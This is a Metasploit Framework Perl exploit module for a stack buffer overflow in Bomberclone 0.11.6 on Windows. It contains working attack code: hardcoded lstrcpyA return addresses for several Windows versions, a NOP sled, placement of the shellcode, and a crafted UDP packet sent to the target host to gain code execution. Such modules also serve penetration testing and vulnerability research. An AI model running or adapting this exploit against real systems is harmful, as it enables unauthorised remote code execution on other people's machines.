##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::bomberclone_overflow_win32;
use base "Msf::Exploit";
use strict;
use Pex::Text;
my $advanced = { };

my $info =
  {
	'Name'  => 'Bomberclone 0.11.6 Buffer Overflow',
	'Version'  => '$Revision: 1.2 $',
	'Authors' => [ 'Jacopo Cervini <acaro [at] jervus.it>', ],

	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32' ],
	'Priv'  => 0,

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 11000],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },

	'Payload' =>
	  {
		'Space'     => 344,
		'BadChars'  => "\x00",
		'Keys'      => ['+ws2ord'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
		This module exploits a stack buffer overflow in Bomberclone 0.11.6 for Windows.
		The return address is overwritten with lstrcpyA memory address,
		the second and third value are the destination buffer,
		the fourth value is the source address of our buffer in the stack.
		This exploit is like a return in libc.
		
						ATTENTION
	The shellcode is exec ONLY when someone try to close bomberclone. 
  
}),

	'Refs'  =>
	  [
		['OSVDB', '23263'],
		['BID',   '16697'],
		['URL',   'http://www.frsirt.com/english/advisories/2006/0643'],
	  ],

	'Targets' =>
	  [
		['Windows XP SP2 Italian',     0x7c80c729 ], 	#lstrcpyA address in kernel32.dll
		['Windows 2000 SP1 English',   0x77e85f08 ], 	#lstrcpyA address in kernel32.dll
		['Windows 2000 SP0 Italian',   0x77e95e8b ], 	#lstrcpyA address in kernel32.dll
	  ],

	'Keys' => ['bomberclone'],

	'DisclosureDate' => 'Feb 16 2006',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;

	my $target = $self->Targets->[$target_idx];

	if (! $self->InitNops(128)) {
		$self->PrintLine("[*] Failed to initialize the nop module.");
		return;
	}
	
	my $nop = $self->MakeNops(421);

	my $pattern = $nop ;
	$pattern .= $shellcode;
	$pattern .= pack('V', $target->[1]);
	$pattern .= "\x04\xec\xfd\x7f"x2;
	$pattern .= "\xa4\xfa\x22\x00";		# our buffer in the stack it is always there

	my $request = "\x00\x00\x00\x00\x38\x03\x41" . $pattern . "\r\n";

	$self->PrintLine(sprintf ("[*] Trying ".$target->[0]." using lstrcpyA address at 0x%.8x...", $target->[1]));

	my $s = Msf::Socket::Udp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$s->Send($request);
	$s->Recv(-1, 10);
	$s->Close();
	return;
}


